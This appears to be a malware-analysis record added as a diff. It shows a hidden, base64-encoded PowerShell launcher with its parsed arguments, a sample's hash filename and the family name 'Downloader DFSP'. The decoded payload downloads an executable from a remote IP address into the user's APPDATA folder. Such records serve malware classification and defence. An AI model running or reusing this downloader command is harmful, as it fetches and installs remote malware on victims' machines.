@@ -1,0 +1,25 @@
+######################### START #########################
+
+
+
+[Original Code]
+
+"powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAHkAcwBUAEUA
+
+[Filename]
+
+ffaf90610bc16b296ec8ae93a4072f5bab58fde2363a87523b2090edf7e3221f.bin
+
+[Arguments]
+
+['-NoP', '-sta', '-NonI', '-W Hidden', '-Enc']
+
+[B64 Decoded]
+
+(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");
+
+[Family Name]
+
+Downloader DFSP
+
+#########################  END  #########################
